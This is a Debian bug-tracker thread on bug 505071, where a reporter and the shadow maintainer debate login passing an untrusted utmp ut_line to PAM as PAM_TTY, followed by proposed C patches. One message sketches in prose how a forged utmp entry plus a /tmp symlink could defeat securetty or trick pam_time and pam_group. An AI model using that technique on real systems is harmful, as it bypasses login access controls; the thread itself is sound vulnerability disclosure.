> login_4.1.3-1_i386.deb ...

The untrusted ut_line is now internally used for utmp only (so there
should be no security issues there), but is passed to PAM as PAM_TTY.
Thus an attacker could:
 - cause securetty checks to fail resulting in a DoS, or
 - bypass or trick some checks in pam_time or pam_group.
Please let me know if you require further details.

[Am puzzled that the bug embodied in is_my_tty() was left, and by the
insistence to use ut_line in preference to ttyname().]

Please re-open the bug.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Thu, 16 Apr 2009 13:30:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=106), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=106), [link](#105)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 16 Apr 2009 13:30:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=108), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=108), [link](#107)).

---

[Message #109](#109) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=109), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=109), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Paul Szabo <psz@maths.usyd.edu.au>, 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow
1:4.1.3-1
Date: Thu, 16 Apr 2009 15:23:55 +0200
```
Hello,

On Thu, Apr 16, 2009 at 07:59:17PM +1000, psz@maths.usyd.edu.au wrote:
>
> > We believe that the bug you reported is fixed in ...
> > login_4.1.3-1_i386.deb ...
>
> The untrusted ut_line is now internally used for utmp only (so there
> should be no security issues there), but is passed to PAM as PAM_TTY.

Please state more clearly why it's untrusted, and why it's a problem.

This statement as such is useless, and as it seems you already have dig
into it, it should be easy for you report your findings.
If you have ideas on what should be done (or even better, patches), they
are welcomed. If you want to change the utmp handling of login, that's
fine, but please explain.

If I have to look again in the history of the bug, in the source, come back
to your statement, make a proposal, close the bug, receive this kind of
comment, etc. it is a waste of time.

> Thus an attacker could:
>  - cause securetty checks to fail resulting in a DoS, or
>  - bypass or trick some checks in pam_time or pam_group.
> Please let me know if you require further details.

Yes, further details would be welcomed.

> [Am puzzled that the bug embodied in is_my_tty() was left, and by the
> insistence to use ut_line in preference to ttyname().]

Am puzzled about that comment.

> Please re-open the bug.

Please do if it's the same bug (but with a rational).
Please open a new bug if it's another bug (explanations are also needed,
and proposals are welcomed)

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Thu, 16 Apr 2009 22:06:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=111), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=111), [link](#110)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 16 Apr 2009 22:06:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=113), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=113), [link](#112)).

---

[Message #114](#114) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=114), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=114), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Fri, 17 Apr 2009 07:55:23 +1000
```
Dear Nicolas,

> Please state more clearly ...
> If I have to look again ... it is a waste of time.

That discussion is not fruitful.

> If you have ... patches, they are welcomed.

Please see below. The patch of src/login.c is essential for security;
I would prefer to use the libmisc/utmp.c patch also.

Hmm... am now thinking that hostname (PAM_RHOST) may also be dodgy.

>> Please re-open the bug.
> Please do ...

I do not think I can re-open (would not know how, and I think am banned
from doing control things since the kerfuffle in #299007).

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

--- src/login.c.bak	2009-04-17 07:00:50.000000000 +1000
+++ src/login.c	2009-04-17 07:30:51.000000000 +1000
@@ -479,7 +479,14 @@
 	 * entry (will not overwrite remote hostname).  --marekm
 	 */
 	checkutmp (!amroot);
-	STRFCPY (tty, utent.ut_line);
+	/*
+	 * PSz 17 Apr 09 Though we may handle ut_line correctly (for Linux),
+	 * we should not trust PAM_TTY to its vagaries...
+	 *STRFCPY (tty, utent.ut_line);
+	 */
+	tmp = ttyname (0);
+	if (NULL == tmp) { tmp = "UNKNOWN"; }
+	STRFCPY (tty, tmp);
 #ifndef USE_PAM
 	is_console = console (tty);
 #endif
--- libmisc/utmp.c.bak	2008-11-23 10:56:10.000000000 +1100
+++ libmisc/utmp.c	2009-04-17 07:53:08.000000000 +1000
@@ -127,23 +127,43 @@
 			(void) puts (NO_UTENT);
 			exit (EXIT_FAILURE);
 		}
-		line = ttyname (0);
-		if (NULL == line) {
-			(void) puts (NO_TTY);
-			exit (EXIT_FAILURE);
-		}
-		if (strncmp (line, "/dev/", 5) == 0) {
-			line += 5;
-		}
+/*
+ *		line = ttyname (0);
+ *		if (NULL == line) {
+ *			(void) puts (NO_TTY);
+ *			exit (EXIT_FAILURE);
+ *		}
+ *		if (strncmp (line, "/dev/", 5) == 0) {
+ *			line += 5;
+ *		}
+ */
 		memset ((void *) &utent, 0, sizeof utent);
 		utent.ut_type = LOGIN_PROCESS;
 		utent.ut_pid = pid;
-		strncpy (utent.ut_line, line, sizeof utent.ut_line);
-		/* XXX - assumes /dev/tty?? or /dev/pts/?? */
-		strncpy (utent.ut_id, utent.ut_line + 3, sizeof utent.ut_id);
+/*
+ *		strncpy (utent.ut_line, line, sizeof utent.ut_line);
+ *		* XXX - assumes /dev/tty?? or /dev/pts/?? *
+ *		strncpy (utent.ut_id, utent.ut_line + 3, sizeof utent.ut_id);
+ */
 		strcpy (utent.ut_user, "LOGIN");
 		utent.ut_time = time (NULL);
 	}
+	/*
+	 * PSz 17 Apr 09 Sanitize ut_line and ut_id anyway... so why
+	 * did we bother with getutent and is_my_tty: for ut_host that
+	 * we cannot trust either?
+	 */
+	line = ttyname (0);
+	if (NULL == line) {
+		(void) puts (NO_TTY);
+		exit (EXIT_FAILURE);
+	}
+	if (strncmp (line, "/dev/", 5) == 0) {
+		line += 5;
+	}
+	strncpy (utent.ut_line, line, sizeof utent.ut_line);
+	/* XXX - assumes /dev/tty?? or /dev/pts/?? */
+	strncpy (utent.ut_id, utent.ut_line + 3, sizeof utent.ut_id);
 }

 #elif defined(LOGIN_PROCESS)

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Fri, 17 Apr 2009 01:21:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=116), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=116), [link](#115)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 17 Apr 2009 01:21:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=118), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=118), [link](#117)).

---

[Message #119](#119) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=119), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=119), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Fri, 17 Apr 2009 11:18:16 +1000
```
>> Thus an attacker could:
>>  - cause securetty checks to fail resulting in a DoS, or
>>  - bypass or trick some checks in pam_time or pam_group.
> Please state more clearly ...

We have seen how utmp entries can be "fudged", left behind, with or
without access to group utmp.

Suppose a utmp entry is "fabricated" with "correct" PID etc, and ut_line
set to /tmp/x and /tmp/x made a symlink to the "correct" tty. That entry
will then be used by login; it will set PAM_TTY to /tmp/x, which will
fail securetty checks: resulting in a DoS.

Suppose we see pam_time or pam_group allowing something to (e.g.) tty0.
Then we "fabricate" a utmp entry with ut_line set to /tmp/tty0 and make
/tmp/tty0 point to our tty. Login will set PAM_TTY to /tmp/tty0 and PAM
will give us the goodies.

Please let me know if the above is unclear or insufficient.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Fri, 17 Apr 2009 20:48:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=121), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=121), [link](#120)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 17 Apr 2009 20:48:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=123), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=123), [link](#122)).

---

[Message #124](#124) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=124), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=124), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Sat, 18 Apr 2009 06:45:26 +1000
```
Dear Nicolas,

> ... If you want to change the utmp handling ...

Will think about that, and get back to you in a few days.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Fri, 17 Apr 2009 21:23:30 GMT) ([full text](bugreport.cgi?bug=505071;msg=126), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=126), [link](#125)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 17 Apr 2009 21:23:30 GMT) ([full text](bugreport.cgi?bug=505071;msg=128), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=128), [link](#127)).

---

[Message #129](#129) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=129), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=129), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow
1:4.1.3-1
Date: Fri, 17 Apr 2009 23:21:44 +0200
```
reopen 505071
thanks

Hello,

On Fri, Apr 17, 2009 at 07:55:23AM +1000, psz@maths.usyd.edu.au wrote:
>
> Please see below. The patch of src/login.c is essential for security;
> I would prefer to use the libmisc/utmp.c patch also.

I changed src/login.c

in libmisc/utmp.c, I only sanitized ut_line.

Is it necessary to reset ut_id?
There isn't a single/standard way to define ut_id. If the caller of login
did not use the same algorithm (ut_line+3), then a new entry will be added
in utmp.
What would be the consequences of a wrong/forged ut_id?

If all fields are reset, then, yes we could remove the getutent() loop.

> Hmm... am now thinking that hostname (PAM_RHOST) may also be dodgy.

utent.ut_host is only used to set:
 * fromhost (only used for SYSLOG)
 * failent

A forged ut_host does not seems critical.

> I do not think I can re-open (would not know how, and I think am banned
> from doing control things since the kerfuffle in #299007).

I would be really surprised that you would be banned from the BTS (I only
heard about one case in the past).

Instructions are there:
<http://www.debian.org/Bugs/server-control>

Best Regards,
--
Nekral

```

---

**Bug reopened, originator not changed.**
Request was from `Nicolas François <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Fri, 17 Apr 2009 21:27:14 GMT) ([full text](bugreport.cgi?bug=505071;msg=131), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=131), [link](#130)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sat, 18 Apr 2009 06:36:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=133), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=133), [link](#132)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 18 Apr 2009 06:36:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=135), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=135), [link](#134)).

---

[Message #136](#136) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=136), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=136), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Sat, 18 Apr 2009 16:28:57 +1000
```
Dear Nicolas,

Is shadow used on non-Linux or non-PAM machines: do you need to worry
about code within the likes of
#ifndef USE_PAM
...
#endif
#ifdef __linux__
#else
...
#endif
?

If yes, I guess the final endpwent() group in login.c should be moved up
to before setup_uid_gid().

Thanks, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sat, 18 Apr 2009 08:15:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=138), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=138), [link](#137)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 18 Apr 2009 08:15:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=140), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=140), [link](#139)).

---

[Message #141](#141) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=141), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=141), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Sat, 18 Apr 2009 18:13:12 +1000
```
Dear Nicolas,

Sorry but it occurs to me I was not clear enough in my previous message.
My question of "is shadow used on non-Linux or non-PAM machines" relates
to utmp handling: does it need to handle those cases also?

Thanks, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sat, 18 Apr 2009 12:30:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=143), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=143), [link](#142)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 18 Apr 2009 12:30:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=145), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=145), [link](#144)).

---

[Message #146](#146) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=146), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=146), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Paul Szabo <psz@maths.usyd.edu.au>, 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow
1:4.1.3-1
Date: Sat, 18 Apr 2009 14:28:18 +0200
```
Hello,

On Sat, Apr 18, 2009 at 04:28:57PM +1000, psz@maths.usyd.edu.au wrote:
>
> Is shadow used on non-Linux or non-PAM machines: do you need to worry
> about code within the likes of
> #ifndef USE_PAM
> ...
> #endif
> #ifdef __linux__
> #else
> ...
> #endif
> ?

shadow is used on non-PAM machines.

I know that the previous maintainer used shadow on non-Linux machine
(Solaris or OpenSolaris?), although I'm not sure it's widely distributed
(other distributions / UNIXes have shadow tool equivalents)

Getting rid of __linux__ for utmp.c would be nice. I don't think it really
makes sense to make a difference based on linux. I would prefer to make a
difference based on the availability of fields in the utmp structure (e.g.
IIRC BSD system have no ut_id field, which could change the way entries
should be searched / registered).
One difference with linux might be that it supports both UTMP and UTMPX,
but they are equivalent so there is no need to do both UTMP and UTMPX.
In that case, I would just prefer to remove HAVE_UTMPX from linux builds,
but have a single source in utmp.c

> If yes, I guess the final endpwent() group in login.c should be moved up
> to before setup_uid_gid().

Agreed (even "if no"). The necessary structures should have been copied
before (this would have to be checked).

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sat, 18 Apr 2009 23:09:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=148), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=148), [link](#147)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 18 Apr 2009 23:09:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=150), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=150), [link](#149)).

---

[Message #151](#151) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=151), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=151), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Sun, 19 Apr 2009 09:06:38 +1000
```
Dear Nicolas,

> I changed src/login.c
> in libmisc/utmp.c, I only sanitized ut_line.

Thanks. New patches (replacing my previous ones) below, including the
move of endpwent(), and more verbose comments. The patch for login.c
is essential. The patch for utmp.c is mostly "as you wish"; there is a
missed endutent() there, am not sure whether correct or how important.

> utent.ut_host is only used to ...
> A forged ut_host does not seems critical.

Thanks, I agree.

Further comments:

Seems to me that su.c needs endgrent() for when SU_WHEEL_ONLY (this is
not a security issue).

In newgrp.c also, endpwent() needs to be moved to before the UID/GID
change (as was in login.c); I do not give patches. - Do these moves
warrant a DSA?

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

--- src/login.c.old	2009-04-17 07:00:50.000000000 +1000
+++ src/login.c	2009-04-19 08:54:00.000000000 +1000
@@ -449,6 +449,7 @@
 #else
 	int delay;
 	struct spwd *spwd = NULL;
+	struct spwd spent;
 #endif
 	/*
 	 * Some quick initialization.
@@ -464,6 +465,16 @@

 	amroot = (getuid () == 0);
 	Prog = Basename (argv[0]);
+	/*
+	 * PSz 18 Apr 09 Will this "work" unless we are root?
+	 * Should we test
+	if (geteuid() != 0) {
+		fprintf (stderr, _("%s: Cannot possibly work without effective root\n"), Prog);
+		exit (1);
+	}
+	 * ?
+	 * Debian /bin/login is not setuid, cannot work without amroot.
+	 */

 	process_flags (argc, argv);

@@ -477,9 +488,22 @@
 	 * even if your getty is broken, or if something corrupts utmp,
 	 * but users must "exec login" which will use the existing utmp
 	 * entry (will not overwrite remote hostname).  --marekm
+	 * PSz 18 Apr 09 As seen in
+	 *   <http://bugs.debian.org/505071>
+	 *   <http://bugs.debian.org/505271>
+	 * we cannot trust utmp: should set our own, new entry.
+	 * On Debian at least, we will never succeed without amroot
+	 * (should have exited already?), should never be picky...
 	 */
 	checkutmp (!amroot);
-	STRFCPY (tty, utent.ut_line);
+	/*
+	 * PSz 17 Apr 09 Though we may handle ut_line correctly (for Linux),
+	 * we should not trust PAM_TTY to its vagaries...
+	 *STRFCPY (tty, utent.ut_line);
+	 */
+	tmp = ttyname (0);
+	if (NULL == tmp) { tmp = "UNKNOWN"; }
+	STRFCPY (tty, tmp);
 #ifndef USE_PAM
 	is_console = console (tty);
 #endif
@@ -496,6 +520,12 @@
 		 * create the utmp entry and fill in ut_addr.
 		 * gethostbyname() is not 100% reliable (the remote host may
 		 * be unknown, etc.).  --marekm
+		 * PSz 18 Apr 09 As commented above we cannot trust
+		 * utmp, should have set our new entry: should now fill
+		 * in ut_addr and ut_host. Even if gethostbyname() fails
+		 * because forward lookup is not provided, and whether
+		 * this lookup will get back to the original IP...
+		 * (should telnetd have refused for such hosts?).
 		 */
 		he = gethostbyname (hostname);
 		if (NULL != he) {
@@ -648,6 +678,11 @@
 	/*
 	 * hostname & tty are either set to NULL or their correct values,
 	 * depending on how much we know.
+	 * PSz 18 Apr 09 PAM_RHOST and PAM_TTY must be kept safe:
+	 * PAM_RHOST is used e.g. in pam_rhosts_auth. We only ever set
+	 * hostname from rflg or hflg not from ut_host, so is safe.
+	 * PAM_TTY is used e.g. in pam_time and pam_group. We set tty
+	 * from ttyname not from ut_line, so is safe.
 	 */
 	retcode = pam_set_item (pamh, PAM_RHOST, hostname);
 	PAM_FAIL_CHECK;
@@ -1176,6 +1211,19 @@
 		}
 	}

+/* PSz 18 Apr 09 Must do this before changing UID, before user access */
+/*
+ * Copy spwd so can use in agecheck later, though I do not think that
+ * endspent() would invalidate the previously obtained reference
+ */
+	spent = *spwd;
+	endpwent ();		/* stop access to password file */
+	endgrent ();		/* stop access to group file */
+	endspent ();		/* stop access to shadow passwd file */
+#ifdef	SHADOWGRP
+	endsgent ();		/* stop access to shadow group file */
+#endif
+
 	/* We call set_groups() above because this clobbers pam_groups.so */
 #ifndef USE_PAM
 	if (setup_uid_gid (&pwent, is_console))
@@ -1250,7 +1298,8 @@
 #endif
 			printf (".\n");
 		}
-		agecheck (spwd);
+		/* agecheck (spwd); */
+		agecheck (&spent);

 		mailcheck ();	/* report on the status of mail */
 #endif				/* !USE_PAM */
@@ -1269,12 +1318,15 @@
 	(void) signal (SIGHUP, SIG_DFL);	/* added this.  --marekm */
 	(void) signal (SIGINT, SIG_DFL);	/* default interrupt signal */

-	endpwent ();		/* stop access to password file */
-	endgrent ();		/* stop access to group file */
-	endspent ();		/* stop access to shadow passwd file */
-#ifdef	SHADOWGRP
-	endsgent ();		/* stop access to shadow group file */
-#endif
+/*
+ * PSz 18 Apr 09 Must do this before changing UID, before user access
+ *	endpwent ();		* stop access to password file *
+ *	endgrent ();		* stop access to group file *
+ *	endspent ();		* stop access to shadow passwd file *
+ * #ifdef	SHADOWGRP
+ *	endsgent ();		* stop access to shadow group file *
+ * #endif
+ */
 	if (0 == pwent.pw_uid) {
 		SYSLOG ((LOG_NOTICE, "ROOT LOGIN %s", fromhost));
 	} else if (getdef_bool ("LOG_OK_LOGINS")) {
--- libmisc/utmp.c.old	2008-11-23 10:56:10.000000000 +1100
+++ libmisc/utmp.c	2009-04-19 08:09:22.000000000 +1000
@@ -68,17 +68,27 @@
 		snprintf (full_tty, sizeof full_tty, "/dev/%s", tty);
 		tty = full_tty;
 	}
-
-	if (   (stat (tty, &by_name) != 0)
-	    || (fstat (STDIN_FILENO, &by_fd) != 0)) {
-		return false;
-	}
-
-	if (by_name.st_rdev != by_fd.st_rdev) {
+	/*
+	 * PSz 19 Apr 09 Might as well just compare to ttyname():
+	 * code below may be too complex (or unsafe/raceable).
+	 */
+	if (strcmp(tty,ttyname(0))) {
 		return false;
 	} else {
 		return true;
 	}
+/*
+ *	if (   (stat (tty, &by_name) != 0)
+ *	    || (fstat (STDIN_FILENO, &by_fd) != 0)) {
+ *		return false;
+ *	}
+ *
+ *	if (by_name.st_rdev != by_fd.st_rdev) {
+ *		return false;
+ *	} else {
+ *		return true;
+ *	}
+ */
 }

 /*
@@ -101,10 +111,29 @@
 {
 	char *line;
 	struct utmp *ut;
+	char reuseid[32];
 	pid_t pid = getpid ();

 	setutent ();

+	/*
+	 * PSz 19 Apr 09 I would like login.c to do its own utmp
+	 * handling, setting up utmp/wtmp from scratch and un-setting
+	 * them at exit. Did not do so because:
+	 * - do not have "working examples" in front of me, there are
+	 *   too many different systems to support (am lazy);
+	 * - change would require cooperation from telnetd etc, there
+	 *   would be duplication of entries until they stopped doing
+	 *   utmp.
+	 * We re-use ut_id (if found below), but set everything else
+	 * ourselves. Re-using ut_id avoids duplication of entries,
+	 * and is "safe". By re-writing utmp completely, we may lose
+	 * "important" data like login time or remote host: but only
+	 * when these were set already, and user done a new login;
+	 * this cannot happen when /bin/login is not setuid, cannot
+	 * happen on Debian.
+	 */
+
 	/* First, try to find a valid utmp entry for this process.  */
 	while ((ut = getutent ()) != NULL) {
 		if (   (ut->ut_pid == pid)
@@ -121,29 +150,56 @@

 	/* If there is one, just use it, otherwise create a new one. */
 	if (NULL != ut) {
-		utent = *ut;
+		strncpy (reuseid, utent.ut_id, sizeof reuseid);
 	} else {
 		if (picky) {
 			(void) puts (NO_UTENT);
 			exit (EXIT_FAILURE);
 		}
-		line = ttyname (0);
-		if (NULL == line) {
-			(void) puts (NO_TTY);
-			exit (EXIT_FAILURE);
-		}
-		if (strncmp (line, "/dev/", 5) == 0) {
-			line += 5;
-		}
-		memset ((void *) &utent, 0, sizeof utent);
-		utent.ut_type = LOGIN_PROCESS;
-		utent.ut_pid = pid;
-		strncpy (utent.ut_line, line, sizeof utent.ut_line);
-		/* XXX - assumes /dev/tty?? or /dev/pts/?? */
+		reuseid[0] = '\0';
+/*
+ *		line = ttyname (0);
+ *		if (NULL == line) {
+ *			(void) puts (NO_TTY);
+ *			exit (EXIT_FAILURE);
+ *		}
+ *		if (strncmp (line, "/dev/", 5) == 0) {
+ *			line += 5;
+ *		}
+ *		memset ((void *) &utent, 0, sizeof utent);
+ *		utent.ut_type = LOGIN_PROCESS;
+ *		utent.ut_pid = pid;
+ *		strncpy (utent.ut_line, line, sizeof utent.ut_line);
+ *		* XXX - assumes /dev/tty?? or /dev/pts/?? *
+ *		strncpy (utent.ut_id, utent.ut_line + 3, sizeof utent.ut_id);
+ *		strcpy (utent.ut_user, "LOGIN");
+ *		utent.ut_time = time (NULL);
+ */
+	}
+	line = ttyname (0);
+	if (NULL == line) {
+		(void) puts (NO_TTY);
+		exit (EXIT_FAILURE);
+	}
+	if (strncmp (line, "/dev/", 5) == 0) {
+		line += 5;
+	}
+	memset ((void *) &utent, 0, sizeof utent);
+	utent.ut_type = LOGIN_PROCESS;
+	utent.ut_pid = pid;
+	strncpy (utent.ut_line, line, sizeof utent.ut_line);
+	/* XXX - assumes /dev/tty?? or /dev/pts/?? */
+	if ('\0' != reuseid[0]) {
+		strncpy (utent.ut_id, reuseid, sizeof utent.ut_id);
+	} else {
 		strncpy (utent.ut_id, utent.ut_line + 3, sizeof utent.ut_id);
-		strcpy (utent.ut_user, "LOGIN");
-		utent.ut_time = time (NULL);
 	}
+	strcpy (utent.ut_user, "LOGIN");
+	utent.ut_time = time (NULL);
+
+	/* PSz 19 Apr 09 Seems we missed endutent()...
+	 * not important, would be done later in setutmp */
+	endutent ();
 }

 #elif defined(LOGIN_PROCESS)
@@ -438,6 +494,10 @@
 	utxent = utxline;
 	utent = utline;

+	/* PSz 19 Apr 09 Seems we missed endutent()... */
+	endutxent ();
+	endutent ();
+
 	return err;
 }

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
